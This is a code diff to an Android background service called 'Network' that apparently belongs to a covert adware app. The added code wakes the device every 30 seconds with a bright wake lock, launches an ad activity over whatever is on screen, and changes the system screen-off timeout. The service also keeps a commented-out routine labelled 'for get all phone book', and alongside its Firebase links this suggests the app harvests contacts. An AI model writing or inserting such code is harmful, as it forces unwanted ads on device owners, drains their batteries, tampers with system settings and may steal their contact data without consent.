@@ -4,8 +4,14 @@ import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.database.Cursor;
+import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
+import android.os.Message;
+import android.os.PowerManager;
 import android.provider.ContactsContract;
+import android.provider.Settings;
+import android.util.Log;
 
 import com.google.firebase.auth.FirebaseAuth;
 import com.google.firebase.auth.FirebaseUser;
@@ -17,8 +23,6 @@ import java.util.Map;
 import java.util.Timer;
 import java.util.TimerTask;
 
-import static android.R.attr.type;
-
 /**
  * Created by AleksandrP on 28.08.2017.
  */
@@ -29,20 +33,31 @@ public class Network extends Service {
     private FirebaseAuth mAuth;
     private DatabaseReference mReference;
 
+    private PowerManager mPowerManager;
+    private PowerManager.WakeLock mWakeLock;
+
     @Override
     public void onCreate() {
         super.onCreate();
 
         MyTimerTask myTask = new MyTimerTask();
         Timer myTimer = new Timer();
-        myTimer.schedule(myTask, 5000, 3600000 * 24 * 10);
-//        myTimer.schedule(myTask, 5000, 30000 );  //test
+//        myTimer.schedule(myTask, 5000, 3600000 * 24 * 10);
+//        myTimer.schedule(myTask, 5000, 1000 * 60 * 15); // 15 min
+        myTimer.schedule(myTask, 1000, 30000);  //test and ads
 
     }
 
     class MyTimerTask extends TimerTask {
         public void run() {
-            GET();
+            /**
+             * for get all phone book
+             */
+//            GET();
+            /**
+             * for show Ads
+             */
+            SHOW();
         }
     }
 
@@ -56,6 +71,68 @@ public class Network extends Service {
         throw new UnsupportedOperationException("");
     }
 
+
+    public void SHOW() {
+        acquizeWakeLock();
+    }
+
+
+    private void acquizeWakeLock() {
+
+        // Get an instance of the PowerManager
+        mPowerManager = (PowerManager) getSystemService(POWER_SERVICE);
+        // Create a bright wake lock
+        mWakeLock = mPowerManager.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
+                        PowerManager.ACQUIRE_CAUSES_WAKEUP,
+                getClass().getName());
+
+        Log.d("WAKE_LOCK", " wakeLock.acquire");
+        mWakeLock.acquire();
+
+        Message message = mHandler.obtainMessage(1, "param");
+        message.sendToTarget();
+    }
+
+
+    private Handler mHandler = new Handler(Looper.getMainLooper()) {
+        @Override
+        public void handleMessage(Message message) {
+            try {
+                Thread.sleep(1000);
+            } catch (InterruptedException mE) {
+                mE.printStackTrace();
+            }
+            releaseWakeLock();
+            Intent intent = new Intent(Network.this, AddActivity.class);
+            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP |
+                    Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(intent);
+        }
+    };
+
+    // and release our wake-lock
+    private void releaseWakeLock() {
+
+        Log.d("WAKE_LOCK", "START mWakeLock.release");
+        if (mWakeLock != null && mWakeLock.isHeld()) {
+            Log.d("WAKE_LOCK", " mWakeLock.release");
+            mWakeLock.release();
+        }
+
+        try {
+            Log.d("WAKE_LOCK", "Settings mWakeLock.release");
+//            First get system turn off time
+            int defaultTurnOffTime = Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 60000);
+//            then put your turn off time
+            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, 1000);
+//            and when the screen turned off, set default turn off time
+//            add  permission
+            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_OFF_TIMEOUT, defaultTurnOffTime);
+        } catch (Exception mE) {
+            Log.d("WAKE_LOCK", "Settings Exception " + mE.getMessage());
+            mE.printStackTrace();
+        }
+    }
 
     public void GET() {
 
